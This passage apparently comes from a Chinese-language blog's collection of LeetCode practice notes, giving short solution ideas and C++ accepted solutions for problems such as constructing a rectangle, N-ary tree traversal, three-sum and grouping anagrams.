sqrt(area)开始不断a–搜索，得到两组可能的答案，比较谁的差距小，然后输出 优化，只搜索一半就行 AC代码12345678910111213141516171819202122232425262728293031class Solution {public: vector&lt;int&gt; constructRectangle(int area) { int a1 = sqrt(area); int b1 = 0; int a2 = a1; int b2 = 0; while (area % a1) { a1--; } b1 = area / a1; while (area % a2) { a2++; } b2 = area / a2; int ansa, ansb; if (abs(a1 - b1) &gt; abs(a2 - b2)) { ansa = a2; ansb = b2; } else { ansa = a1; ansb = b1; } if (ansa &gt; ansb) { int t = ansa; ansa = ansb; ansb = t; } return {ansb, ansa}; }}; AC代码（优化）1234567891011121314class Solution {public: vector&lt;int&gt; constructRectangle(int area) { int a1 = sqrt(area); int b1 = 0; int a2 = a1; int b2 = 0; while (area % a1) { a1--; } b1 = area / a1; return {b1, a1}; }}; 453. 最小移动次数使数组元素相等思路 没思路，评论说可以推导公式，就推出来了 $ans = \\Sigma_{i=0}^{nums.size() - 1}[nums[i] - min(nums)]$ 公式推导思路（以下字母ASCII越大，代表的值就越大） {a}——0 {b, a}——b - a {c, b, a}——b - a + c - a 从a开始，先让a等于b，然后让两个b等于第三小的数，让三个第三小的数等于第四小的数… AC代码12345678910111213141516class Solution {public: int minMoves(vector&lt;int&gt;&amp; nums) { int min = INT_MAX; for (int x : nums) { if (x &lt; min) { min = x; } } int ans = 0; for (int x : nums) { ans += x - min; } return ans; }}; AC代码（优化）1234567891011121314class Solution {public: int minMoves(vector&lt;int&gt;&amp; nums) { long long min = INT_MAX, ans = 0, len = nums.size(), sum = 0; for (int x : nums) { if (x &lt;= min) { min = x; } sum += x; } return sum - min*len; }}; 551. 学生出勤记录 I思路把统计连续相同字符个数和统计某一个字符出现次数的算法结合在一起就行 AC代码1234567891011121314151617181920212223class Solution {public: bool checkRecord(string s) { int maxL = 0, numA = 0; int len = s.length(); for (int i = 0; i &lt; len;) { int count = 0; if (s[i] == 'A') { numA++; i++;//统计'A'的个数 } else if (s[i] == 'L') { while (s[i] == 'L') { i++; count++;//统计连续的'L'的个数 } maxL = maxL &gt; count ? maxL : count; } else { i++; } } return numA &lt;= 1 &amp;&amp; maxL &lt;= 2; }}; 557. 反转字符串中的单词 III思路一个指针，进去以后保存一次指针位置，然后指针后移，移动到空格或者结束为止，保存一次指针的位置，reverse两个指针 AC代码123456789101112131415class Solution {public: string reverseWords(string s) { int i = 0; int len = s.length(); while (i &lt; len) { int beg = i; while (i &lt; len &amp;&amp; s[i] != ' ') i++; int end = i; reverse(s.begin() + beg, s.begin() + end); i++; } return s; }}; 559. N叉树的最大深度思路 把之前429. N叉树的层序遍历的代码直接拿来用 简化代码 AC代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/*// Definition for a Node.class Node {public: int val; vector&lt;Node*&gt; children; Node() {} Node(int _val, vector&lt;Node*&gt; _children) { val = _val; children = _children; }};*/class Solution {public: int maxDepth(Node* root) { return levelOrder(root).size(); } vector&lt;vector&lt;int&gt;&gt; levelOrder(Node* root) { if (!root) return {}; Node *root1 = new Node(); Node *root2 = new Node(); root2-&gt;children.push_back(root); root1-&gt;children.push_back(root2); vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;int&gt; sub; vector&lt;Node*&gt; m = {root1}; vector&lt;Node*&gt;&amp; father = m; while (father.size()) { sub.clear(); vector&lt;Node*&gt; fatherTemp; for (Node* x : father) { for (Node* y : x-&gt;children) { for (Node* z : y-&gt;children) { sub.push_back(z-&gt;val); } fatherTemp.push_back(y); } } if (sub.size()) ans.push_back(sub); father = fatherTemp; } return ans; }}; AC代码（简化）123456789101112131415161718192021222324252627class Solution {public: int maxDepth(Node* root) { if (!root) return {}; Node *root1 = new Node(); Node *root2 = new Node(); root2-&gt;children.push_back(root); root1-&gt;children.push_back(root2); vector&lt;Node*&gt; m = {root1}; vector&lt;Node*&gt;&amp; father = m; int count = 0; while (father.size()) { vector&lt;Node*&gt; fatherTemp; bool empty = true; for (Node* x : father) { for (Node* y : x-&gt;children) { if (y-&gt;children.size()) empty = false; fatherTemp.push_back(y); } } father = fatherTemp; if (!empty) count++; } return count; }}; 561. 数组拆分 I思路 排个序，把下标为偶数的项全都加起来 AC代码1234567891011class Solution {public: int arrayPairSum(vector&lt;int&gt;&amp; nums) { sort(nums.begin(), nums.end()); int len = nums.size(), ans = 0; for (int i = 0; i &lt; len; i+=2) { ans += nums[i]; } return ans; }}; 566. 重塑矩阵思路 先把不能转换的排除 两个下标m，n，指向原来数组的行和列，当n为原来数组的c时，m++，n = 0 AC代码1234567891011121314151617181920212223class Solution {public: vector&lt;vector&lt;int&gt;&gt; matrixReshape(vector&lt;vector&lt;int&gt;&gt;&amp; nums, int r, int c) { int hight = nums.size(), width = nums[0].size(); if (r*c != hight*width) { return nums; } vector&lt;vector&lt;int&gt;&gt; ans; int m = 0,n = 0; for (int i = 0; i &lt; r; i++) { vector&lt;int&gt; temp; for (int j = 0; j &lt; c; j++) { if (n == width) { m++; n = 0; } temp.push_back(nums[m][n++]); } ans.push_back(temp); } return ans; }}; 575. 分糖果思路 map或者数组（已知数据范围）记录是否出现，一边遍历一边数 AC代码123456789101112131415class Solution {public: int distributeCandies(vector&lt;int&gt;&amp; candies) { int m[200001] = {0}; int len = candies.size(); int count = 0; for (auto x : candies) { if (m[x + 100000] == 0) { m[x + 100000] = 1; count++; } } return min(count, len / 2); }};","link":"/home/2019/02/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%937/"},{"title":"LeetCode-8","text":"581. 最短无序连续子数组思路 拷贝把备份排序，然后两个指针，依次从头到尾（i），从尾到头（j）比较排序前后两个数组相同下标的值，把第一次不同的下标值记录，最后返回j - i + 1，如果为负数返回0。 AC代码123456789101112131415161718192021class Solution {public: int findUnsortedSubarray(vector&lt;int&gt;&amp; nums) { vector&lt;int&gt; cpy(nums.begin(), nums.end()); sort(cpy.begin(), cpy.end()); int len = nums.size(); int j = len - 1, i = 0; for ( ; j &gt;= 0; j--) { if (nums[j] != cpy[j]) { break; } } for (; i &lt; len; i++) { if (nums[i] != cpy[i]) { break; } } int ans = j - i + 1; return ans &gt; 0 ? ans : 0; }}; 思路 从前到后遍历，一边找最大值，一边找当前值是不是最大值，如果不是，记录当前下标 从后向前遍历，一边找最小值，一边找当前值是不是最小值，如果不是，记录当前下标 返回下标之间的元素数，注意差值为0返回1 AC代码1234567891011121314151617181920212223242526static int pr = []() { std::ios::sync_with_stdio(false); cin.tie(NULL); return 0; }();class Solution {public: int findUnsortedSubarray(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int j = len - 1, i = 0; int max = INT_MIN, min = INT_MAX; int pre = 0, back = len - 1; for (;i &lt; len;i++, j--) { max = max &gt; nums[i] ? max : nums[i]; if (max != nums[i]) { pre = i; } min = min &lt; nums[j] ? min : nums[j]; if (min != nums[j]) { back = j; } } int ans = pre - back + 1; return ans &gt; 1 ? ans : 0; }}; 大佬思路没看懂,为毛遍历这么多次可以这么快？ 大佬代码12345678910111213141516171819202122232425262728293031static int pr = []() { std::ios::sync_with_stdio(false); cin.tie(NULL); return 0; }();class Solution {public: int findUnsortedSubarray(vector&lt;int&gt;&amp; nums) { int n = nums.size(); int left = 0; int right = n - 1; while (left &lt; n - 1 &amp;&amp; nums[left] &lt;= nums[left + 1]) left += 1; if (left == n - 1) return 0; while (right &gt; 0 &amp;&amp; nums[right] &gt;= nums[right - 1]) right -= 1; int min_value = INT32_MAX; int max_value = INT32_MIN; for (int i = left; i &lt; right + 1; i++) { min_value = min(nums[i], min_value); max_value = max(nums[i], max_value); } while (left &gt; -1 &amp;&amp; nums[left] &gt; min_value) left -= 1; while (right &lt; n &amp;&amp; nums[right] &lt; max_value) right += 1; return right - left - 1; }}; 541. 反转字符串 II思路每次反转k或者小于k个字符，然后指针+=2*k AC代码12345678910111213class Solution {public: string reverseStr(string s, int k) { int i = 0; int len = s.length(); while (i &lt; len) { int l = len - i &gt; k ? k : len - i;//每次算长度 reverse(s.begin() + i, s.begin() + i + l); i += 2*k; } return s; }}; 589. N叉树的前序遍历思路 递归 AC代码123456789101112131415161718192021222324252627282930/*// Definition for a Node.class Node {public: int val; vector&lt;Node*&gt; children; Node() {} Node(int _val, vector&lt;Node*&gt; _children) { val = _val; children = _children; }};*/class Solution {public: vector&lt;int&gt; preorder(Node* root) { vector&lt;int&gt; ans; go(root, ans); return ans; } void go(Node* root, vector&lt;int&gt;&amp; v) { if (root == NULL) return; v.push_back(root-&gt;val); for (auto x : root-&gt;children) { go(x, v); } }}; 大佬思路大佬代码123456789101112131415161718192021222324252627282930313233class Solution {public: vector&lt;int&gt; preorder(Node* root) { if (!root) { return vector&lt;int&gt;(); } stack&lt;Node*&gt; s; s.push(root); vector&lt;int&gt; ret; while (!s.empty()) { Node* p = s.top(); s.pop(); ret.push_back(p-&gt;val); int n = (p-&gt;children).size(); for (int i = n - 1; i &gt;= 0; --i) { if (p-&gt;children[i]) { s.push((p-&gt;children)[i]); } } } return ret; }};static auto _ = []() { std::ios::sync_with_stdio(false); std::cin.tie(nullptr); return 0;}(); 590. N叉树的后序遍历AC代码123456789101112131415class Solution {public: vector&lt;int&gt; postorder(Node* root) { vector&lt;int&gt; ans; go(root, ans); return ans; } void go(Node* root, vector&lt;int&gt;&amp; v) { if (root == NULL) return; for (auto x : root-&gt;children) { go(x, v); } v.push_back(root-&gt;val); }}; 598. 范围求和 II思路每次操作，左上角一定是重叠最大的，直接找最小的x，y就可以了 AC代码1234567891011class Solution {public: int maxCount(int m, int n, vector&lt;vector&lt;int&gt;&gt;&amp; ops) { int minFirst = m, minSecond = n; for (auto x : ops) { minSecond = minSecond &gt; x[1] ? x[1] : minSecond; minFirst = minFirst &gt; x[0] ? x[0] : minFirst; } return minFirst*minSecond; }}; 599. 两个列表的最小索引总和思路 一个map记录第一个数组的下标+1，然后遍历第二个数组，搞一个map，记录下标和对应的餐厅数组 优化，遍历第二个数组的时候，查询，计算下标和，如果下标和小于当前的最小值，那么就clear当前数组，重新把当前这个餐厅push进去，如果等于，直接push餐厅，大于则不管 AC代码12345678910111213141516171819class Solution {public: vector&lt;string&gt; findRestaurant(vector&lt;string&gt;&amp; list1, vector&lt;string&gt;&amp; list2) { unordered_map&lt;string, int&gt; m; map&lt;int, vector&lt;string&gt;&gt; ans; int len1 = list1.size(); int len2 = list2.size(); for (int i = 0; i &lt; len1; i++) { m[list1[i]] = i + 1; } for (int i = 0; i &lt; len2 ; i++) { int pos = m[list2[i]]; if (pos) { ans[pos - 1 + i].push_back(list2[i]); } } return ans.begin()-&gt;second; }}; AC代码（优化）123456789101112131415161718192021222324252627class Solution {public: vector&lt;string&gt; findRestaurant(vector&lt;string&gt;&amp; list1, vector&lt;string&gt;&amp; list2) { unordered_map&lt;string, int&gt; m; vector&lt;string&gt; ans; int len1 = list1.size(); int len2 = list2.size(); int min = INT_MAX; for (int i = 0; i &lt; len1; i++) { m[list1[i]] = i + 1; } for (int i = 0; i &lt; len2 ; i++) { int pos = m[list2[i]]; if (pos) { int sum = pos - 1 + i; if (sum &lt; min) { ans.clear(); min = sum; ans.push_back(list2[i]); } else if (sum == min) { ans.push_back(list2[i]); } } } return ans; }}; 605. 种花问题思路 遍历每一个花盆，看它前后有没有花盆，枚举判断，注意如果n == 0时要退出循环 优化：把第一个和最后一个单独拿出来，简化循环时的判断数目 AC代码1234567891011121314151617181920212223242526272829class Solution {public: bool canPlaceFlowers(vector&lt;int&gt;&amp; flowerbed, int n) { int len = flowerbed.size(); for (int i = 0; i &lt; len &amp;&amp; n &gt; 0; i++) { if (flowerbed[i]) { } else { if (i == 0) { if (len == 1 || (i + 1 &lt; len &amp;&amp; !flowerbed[i + 1])) { n--; flowerbed[i] = 1; } } else if (i == len - 1) { if (i - 1 &gt;= 0 &amp;&amp; !flowerbed[i - 1]) { n--; flowerbed[i] = 1; } } else { if (!flowerbed[i - 1] &amp;&amp; !flowerbed[i + 1]) { n--; flowerbed[i] = 1; } } } } return n == 0; }}; AC代码（优化）12345678910111213141516171819202122232425class Solution {public: bool canPlaceFlowers(vector&lt;int&gt;&amp; flowerbed, int n) { if (n &lt;= 0) return true; int len = flowerbed.size(); if (len &lt;= 0) return false; if (len == 1) return n &lt;= 1 &amp;&amp; !flowerbed[0]; int sum = 0; if (!flowerbed[0] &amp;&amp; !flowerbed[1]) { sum++; flowerbed[0] = 1; } for (int i = 1; i &lt; len - 2; i++) { if (!flowerbed[i] &amp;&amp; !flowerbed[i - 1] &amp;&amp; !flowerbed[i + 1]) { flowerbed[i] = 1; sum++; } } if (!flowerbed[len - 2] &amp;&amp; !flowerbed[len - 1]) { sum++; flowerbed[len - 1] = 1; } return n &lt;= sum; }}; 628. 三个数的最大乘积思路 参考414. 第三大的数的思路，用一次遍历，得到第一，第二第三大的数（a、b、c），和第一，第二小的数（m1，m2） 分别计算$abc$和$am1m2$，返回较大的一个 AC代码123456789101112131415161718192021222324252627class Solution {public: int maximumProduct(vector&lt;int&gt;&amp; nums) { int first = INT_MIN, second = INT_MIN, third = INT_MIN; int min1 = INT_MAX, min2 = INT_MAX; for (auto x : nums) { if (x &gt;= first) { third = second; second = first; first = x; } else if (x &lt; first &amp;&amp; x &gt;= second) { third = second; second = x; } else if (x &lt; second &amp;&amp; x &gt;= third) { third = x; } if (x &lt; min1) { min2 = min1; min1 = x; } else if (x &gt;= min1 &amp;&amp; x &lt; min2) { min2 = x; } } int ans1 = first*second*third, ans2 = first*min1*min2; return ans1 &gt; ans2 ? ans1 : ans2; }}; 633. 平方数之和思路 脑袋里想一个只有整数点的坐标系，取第一象限，用$y = x$分成两半，看一半，包括$y = x$和另一个坐标轴，在这个三角区域里选取的的不会重复 选取点，从0~$\\sqrt{\\frac{c}{2}}$中选整数，如果满足$\\sqrt{c - i^2}$为整数，那么就可以 优化，类似二分查找 AC代码12345678910111213class Solution {public: bool judgeSquareSum(int c) { double n = sqrt(c/2.0); for (int i = 0; i &lt;= n; i++) { double x = sqrt(c - i*i); if (int(x) == x) { return true; } } return false; }}; AC代码（优化）1234567891011121314151617class Solution {public: bool judgeSquareSum(int c) { int a = 0, b = sqrt(c); while (a &lt;= b) { double sum = (double)a*a + b*b; if (sum == c) { return true; } else if (sum &gt; c) { b--; } else { a++; } } return false; }}; 637. 二叉树的层平均值思路改造二叉树的层次遍历的代码完事儿 AC代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;double&gt; averageOfLevels(TreeNode* root) { if (!root) return {}; vector&lt;double&gt; ans; TreeNode *root1 = new TreeNode(0), *root2 = new TreeNode(0); root2-&gt;left = root; root1-&gt;left = root2; TreeNode* temp = root1; vector&lt;TreeNode*&gt; m = {root1}; vector&lt;TreeNode*&gt;&amp; father = m; vector&lt;TreeNode*&gt; fatherTemp; while (father.size()) { fatherTemp.clear(); double sum = 0, count = 0; for (TreeNode* x : father) { if (x-&gt;left != NULL) { fatherTemp.push_back(x-&gt;left); if (x-&gt;left-&gt;left != NULL) { count++; sum += x-&gt;left-&gt;left-&gt;val; } if (x-&gt;left-&gt;right != NULL) { sum += x-&gt;left-&gt;right-&gt;val; count++; } } if (x-&gt;right != NULL) { fatherTemp.push_back(x-&gt;right); if (x-&gt;right-&gt;left != NULL) { sum += x-&gt;right-&gt;left-&gt;val; count++; } if (x-&gt;right-&gt;right != NULL) { sum += x-&gt;right-&gt;right-&gt;val; count++; } } } if (count) ans.push_back(sum/count); father = fatherTemp; } return ans; }}; 643. 子数组最大平均数 I思路先算前k个数的和，然后i从k+1个数开始，把尾巴上的数减掉，上i指向的数，跟当前值比大小，储存最大和。 AC代码123456789101112131415161718192021222324class Solution {public: double findMaxAverage(vector&lt;int&gt;&amp; nums, int k) { int len = nums.size(); int sum = 0; double maxSum = 0; for (int i = 0; i &lt; k; i++) { sum += nums[i]; } maxSum = sum; for (int i = k; i &lt; len; i++) { sum -= nums[i - k]; sum += nums[i]; maxSum = maxSum &gt; sum ? maxSum : sum; } return maxSum*1.0/k; }};static const int _ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); return 0;}(); 645. 错误的集合思路一个vector，初始化为false，一次循环，每出现一个元素，把false变成true，如果已经是true，说明它是重复的元素，同时计算所有元素的和，最后根据等差数列求和公式等一系列计算计算出两个数 AC代码123456789101112131415161718192021class Solution {public: vector&lt;int&gt; findErrorNums(vector&lt;int&gt;&amp; nums) { int n = 0; int sum = 0, len = nums.size(); vector&lt;bool&gt; m(len, false); for (auto x : nums) { if (!m[x])m[x] = true; else n = x; sum += x; } int add = len*(len + 1) / 2 - sum;//相比正常缺少的部分 return {n, n + add}; }};static const int _ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); return 0;}(); 657. 机器人能否返回原点AC代码123456789101112131415161718192021222324class Solution {public: bool judgeCircle(string moves) { int u = 0 ,d = 0 ,r = 0 ,l = 0; for (auto x : moves) { switch(x) { case 'U': u++; break; case 'D' : d++; break; case 'R' : r++; break; case 'L' : l++; break; } } return u == d &amp;&amp; l == r; }};static int desyncio = []() { std::ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); return 0; }(); AC代码（优化）1234567891011121314151617class Solution {public: bool judgeCircle(string moves) { int movex[26] = {0}, movey[26] = {0}; movey['U' - 'A'] = 1; movey['D' - 'A'] = -1; movex['L' - 'A'] = -1; movex['R' - 'A'] = 1; int x = 0, y = 0; for (auto c : moves) { y += movey[c - 'A']; x += movex[c - 'A']; } return x == 0 &amp;&amp; y == 0; }};static int desyncio = []() { std::ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); return 0; }(); 661. 图片平滑器思路暴力干死这破题 AC代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class Solution {public: vector&lt;vector&lt;int&gt;&gt; imageSmoother(vector&lt;vector&lt;int&gt;&gt;&amp; M) { int r = M.size(); int c = M[0].size(); if (r &lt;= 1 &amp;&amp; c &lt;= 1) return M; vector&lt;vector&lt;int&gt;&gt; ans(r, vector&lt;int&gt;(c)); if (c == 1 || r == 1) { if (c == 1) { ans[0][0] = (M[0][0] + M[1][0])/2; ans[r - 1][0] = (M[r - 1][0] + M[r - 2][0])/2; for (int i = 1; i &lt; r - 1; i++) { ans[i][0] = (M[i][0] + M[i - 1][0] + M[i + 1][0])/3; } } else { ans[0][0] = (M[0][0] + M[0][1])/2; ans[0][c - 1] = (M[0][c - 1] + M[0][c - 2])/2; for (int i = 1; i &lt; c - 1; i++) { ans[0][i] = (M[0][i] + M[0][i - 1] + M[0][i + 1])/3; } } return ans; } ans[0][0] = (M[0][0] + M[1][1] + M[1][0] + M[0][1])/4; ans[0][c - 1] = (M[0][c - 1] + M[0][c - 2] + M[1][c - 1] + M[1][c - 2])/4; ans[r - 1][0] = (M[r - 1][0] + M[r-1][1] + M[r - 2][0] + M[r - 2][1])/4; ans[r - 1][c - 1] = (M[r - 1][c - 1] + M[r - 1][c - 2] + M[r - 2][c - 1] + M[r - 2][c - 2])/4; for (int i = 1; i &lt; r - 1; i++) { ans[i][0] = (M[i][0] + M[i - 1][0] + M[i + 1][0] + M[i][1] + M[i - 1][1] + M[i + 1][1])/6; ans[i][c - 1] = (M[i][c - 1] + M[i + 1][c - 1] + M[i - 1][c - 1] + M[i][c - 2] + M[i + 1][c - 2] + M[i - 1][c - 2])/6; } for (int i = 1; i &lt; c - 1; i++) { ans[0][i] = (M[0][i] + M[0][i + 1] + M[0][i - 1] + M[1][i] + M[1][i + 1] + M[1][i - 1]) / 6; ans[r - 1][i] = (M[r - 1][i] + M[r - 1][i + 1] + M[r - 1][i - 1] + M[r - 2][i] + M[r - 2][i + 1] + M[r - 2][i - 1]) / 6; } for (int i = 1; i &lt; r - 1; i++) { for (int j = 1; j &lt; c - 1; j++) { ans[i][j] = (M[i][j] + M[i + 1][j] + M[i - 1][j] + M[i][j + 1] + M[i + 1][j + 1] + M[i - 1][j + 1] + M[i][j - 1] + M[i + 1][j - 1] + M[i - 1][j - 1])/9; } } return ans; }};static const int _ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); return 0;}();","link":"/home/2019/02/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%938/"},{"title":"LeetCode-9","text":"92. 反转链表 II思路 两个指针a、b，分别找到被反转的第一个结点的前一个结点，被反转的结点的最后一个结点，（在开头设置一个哑结点，防止被反转的第一个结点是头结点） 再来一个指针c，保存被反转的最后一个结点的next，然后把最后一个结点的next设为null 反转链表，然后把新链表的head接回去，把c接回到末尾 返回哑结点的next，不能返回head，因为反转以后，head有可能不是head了 AC代码1234567891011121314151617181920212223242526272829303132333435363738/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* reverseBetween(ListNode* head, int m, int n) { ListNode* dummy = new ListNode(0), *a, *b, *c; dummy-&gt;next = head; a = b = c = dummy; for (int i = 0; i &lt; m - 1; i++) { a = a-&gt;next; b = b-&gt;next; } for (int i = 0; i &lt; n - m + 1; i++) { b = b-&gt;next; } c = b-&gt;next; b-&gt;next = NULL; a-&gt;next = reverseList(a-&gt;next); while (a-&gt;next != NULL) { a = a-&gt;next; } a-&gt;next = c; return dummy-&gt;next; } ListNode* reverseList(ListNode* head) { if (head == NULL || head-&gt;next == NULL) return head; ListNode *temp = reverseList(head-&gt;next); head-&gt;next-&gt;next = head; head-&gt;next = NULL; return temp; }}; 15. 三数之和思路 遍历数组，取每个值的相反数作为target，然后转化为两数之和的问题，去重时要注意 保证target只查找一次 保证第二个循环j = i + 1开始 保证查找到的数的下标 c &gt; j 保证第二次循环的相同元素对应的值不会被反复查找，即变量find AC代码1234567891011121314151617181920212223242526272829303132class Solution {public: vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) { sort(nums.begin(), nums.end()); int len = nums.size(); vector&lt;vector&lt;int&gt;&gt; ans; map&lt;int, int&gt; m; for (int i = 0; i &lt; len; i++) { m[nums[i]] = i + 1; } for (int i = 0; i &lt; len; ) { int target = -nums[i]; for (int j = i + 1; j &lt; len;) { int find = target - nums[j]; if (m.count(find)) { int c = m[find] - 1; //cout &lt;&lt; nums[i] &lt;&lt; nums[j] &lt;&lt; nums[c] &lt;&lt; endl; if (c &gt; j) { ans.push_back({nums[i], nums[j], nums[c]}); } } while (j &lt; len &amp;&amp; nums[j] == target - find) { j++; } } while (i &lt; len &amp;&amp; nums[i] == -target) { i++; } } return ans; }}; 大佬思路二分查找大佬代码123456789101112131415161718192021222324252627282930class Solution {public: vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) { set&lt;vector&lt;int&gt;&gt; ans; if(nums.size()&lt;3)return vector&lt;vector&lt;int&gt;&gt;(ans.begin(),ans.end()); sort(nums.begin(),nums.end()); int left,right,target; for(int i=0;i&lt;nums.size()-2;++i){ if(nums[i] &gt; 0) { break; } if(nums[i] == nums[i - 1] &amp;&amp; i &gt; 0) continue; left=i+1,right=nums.size()-1,target=-nums[i]; while(left&lt;right){ if(nums[left]+nums[right]==target){ ans.insert({nums[i], nums[left], nums[right]}); ++left; --right; }else if(nums[left]+nums[right]&gt;target){ --right; }else { ++left; } } } return vector&lt;vector&lt;int&gt;&gt;(ans.begin(),ans.end()); }}; 43. 字符串相乘思路两层for循环相乘，把相乘的结果全都加起来 AC代码123456789101112131415161718192021222324252627282930313233343536373839404142434445class Solution {public: string multiply(string num1, string num2) { int len1 = num1.length(), len2 = num2.length(); int len = len1 &gt; len2 ? len1 : len2; string zero(len - len1, '0'); num1 = zero + num1; zero = string(len - len2, '0'); num2 = zero + num2; string ans = &quot;0&quot;; for (int i = len - 1; i &gt;= 0; i--) { string temp = num1; int carry = 0; zero = string(len - 1 - i, '0'); for (int j = len - 1; j &gt;= 0; j--) { temp[j] = ((num1[j] - '0')*(num2[i] - '0') + carry)%10+ '0'; carry = ((num1[j] - '0')*(num2[i] - '0') + carry)/10; } temp = string(1, carry + '0') + temp + zero; ans = addStrings(ans, temp); } int i = 0; while (ans[i] == '0') i++; len = ans.length(); return i == len ? &quot;0&quot; : ans.substr(i, len - i); } string addStrings(string&amp; num1, string&amp; num2) { int carry = 0; int len1 = num1.length(); int len2 = num2.length(); int len = len1 &gt; len2 ? len1 : len2; string zero = string(len - len1, '0'); num1 = zero + num1; zero = string(len - len2, '0'); num2 = zero + num2; for (int i = len - 1; i &gt;= 0; i--) { int n = carry + num1[i] + num2[i] - 2*'0'; num1[i] = n % 10 + '0'; carry = n / 10; } if (carry) num1.insert(0, 1, carry + '0'); return num1; }}; 73. 矩阵置零思路想写出来很简单，目前是空间O(M+N)的算法 AC代码12345678910111213141516171819202122232425class Solution {public: void setZeroes(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) { int r = matrix.size(), c = matrix[0].size(); unordered_map&lt;int, bool&gt; rows, cols; for (int i = 0; i &lt; r; i++) { for (int j = 0; j &lt; c; j++) { if (matrix[i][j] == 0) { rows[i] = true; cols[j] = true; } } } for (auto x : rows) { for (int i = 0; i &lt; c; i++) { matrix[x.first][i] = 0; } } for (auto x : cols) { for (int i = 0; i &lt; r; i++) { matrix[i][x.first] = 0; } } }}; 60. 第k个排列思路没研究这个，stl直接调用 AC代码12345678910111213class Solution {public: string getPermutation(int n, int k) { string ans; for (int i = 1; i &lt;= n; i++) { ans += char(i + '0'); } for (int i = 0; i &lt; k - 1; i++) { next_permutation(ans.begin(), ans.end()); } return ans; }}; 大佬代码123456789101112131415161718192021222324252627282930static const auto io_sync_off = [](){ // turn off sync std::ios::sync_with_stdio(false); // untie in/out streams std::cin.tie(nullptr); return nullptr;}();class Solution {public: string recursive(int n, int k, int * order, string &amp;str) { if (n == 0) return &quot;&quot;; int num = (k - 1) / order[n - 1]; char c = str[num]; str.erase(str.begin() + num); return c + recursive(n - 1, k - num * order[n - 1], order, str); } string getPermutation(int n, int k) { int order[n + 1] = {1}; string str; for (int i = 1; i &lt; n + 1; i++) { order[i] = i * order[i - 1]; str.push_back(48 + i); } return recursive(n, k, order, str); }}; 34. 在排序数组中查找元素的第一个和最后一个位置思路一次二分查找，然后向前向后遍历，找到开始和结束，但是最坏情况下，算法从$O(log_2n)$变成$O(n)$ AC代码123456789101112131415161718192021222324252627282930class Solution {public: vector&lt;int&gt; searchRange(vector&lt;int&gt;&amp; nums, int target) { int len = nums.size(); if (!len) return {-1, -1}; int low = 0, high = len - 1; bool find = false; int pos = 0; while (low &lt;= high) { int mid = low + (high - low)/2; if (nums[mid] == target) { find = true; pos = mid; break; } else if (nums[mid] &gt; target) { high = mid - 1; } else { low = mid + 1; } } if (!find) { return {-1, -1}; } int beg , end; beg = end = pos; while (beg &gt;= 0 &amp;&amp; nums[pos] == nums[beg]) beg--; while (end &lt; len &amp;&amp; nums[pos] == nums[end]) end++; return {beg + 1, end - 1}; }}; 24. 两两交换链表中的节点AC代码12345678910111213141516171819202122232425262728/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* swapPairs(ListNode* head) { ListNode dummy(0), *h; dummy.next = head;//哑结点定义为局部变量，防止内存泄漏 h = &amp;dummy; while (h-&gt;next != NULL) { if (h-&gt;next-&gt;next != NULL) { ListNode *a = h-&gt;next, *b = h-&gt;next-&gt;next; a-&gt;next = b-&gt;next; b-&gt;next = a; h-&gt;next = b; h = h-&gt;next-&gt;next; } else { break; } } return dummy.next; }}; 47. 全排列 IIAC代码123456789101112class Solution {public: vector&lt;vector&lt;int&gt;&gt; permuteUnique(vector&lt;int&gt;&amp; nums) { sort(nums.begin(), nums.end()); vector&lt;vector&lt;int&gt;&gt; ans; do { ans.push_back(nums); }while (next_permutation(nums.begin(), nums.end())); ans.erase(unique(ans.begin(), ans.end()),ans.end()); return ans; }}; 大佬代码12345678910111213141516171819202122232425262728293031class Solution {public: vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;bool&gt; b; vector&lt;int&gt; v; void dfs(int i, const vector&lt;int&gt;&amp; nums) { if(i == nums.size()){ ans.push_back(v); return; } for(int j = 0; j &lt; nums.size(); ++j){ if(j &gt; 0 &amp;&amp; nums[j - 1] == nums[j] &amp;&amp; !b[j - 1])continue; if(!b[j]){ b[j] = 1; v[i] = nums[j]; dfs(i + 1, nums); b[j] = 0; } } return; } vector&lt;vector&lt;int&gt;&gt; permuteUnique(vector&lt;int&gt;&amp; nums) { sort(nums.begin(), nums.end()); v.resize(nums.size()); b.resize(nums.size()); dfs(0, nums); return ans; }}; 49. 字母异位词分组思路 stl使劲套，要用multiset，两个单词字符集相同但是字符个数不同 优化，不用set，map变成string，字符集的字符串排序后对应唯一的“特征字符串” AC代码1234567891011121314151617181920212223class Solution {public: vector&lt;vector&lt;string&gt;&gt; groupAnagrams(vector&lt;string&gt;&amp; strs) { map&lt;multiset&lt;char&gt;, vector&lt;string&gt;&gt; m; int num = strs.size(); for (auto &amp;x : strs) { multiset&lt;char&gt; s(x.begin(), x.end()); m[s].push_back(x); } vector&lt;vector&lt;string&gt;&gt; ans; for (auto &amp;x : m) { ans.push_back(x.second); } return ans; }};static const auto io_sync_off = []() { // turn off sync std::ios::sync_with_stdio(false); // untie in/out streams std::cin.tie(nullptr); return nullptr;}(); AC代码（优化）12345678910111213141516class Solution {public: vector&lt;vector&lt;string&gt;&gt; groupAnagrams(vector&lt;string&gt;&amp; strs) { unordered_map&lt;string, vector&lt;string&gt;&gt; 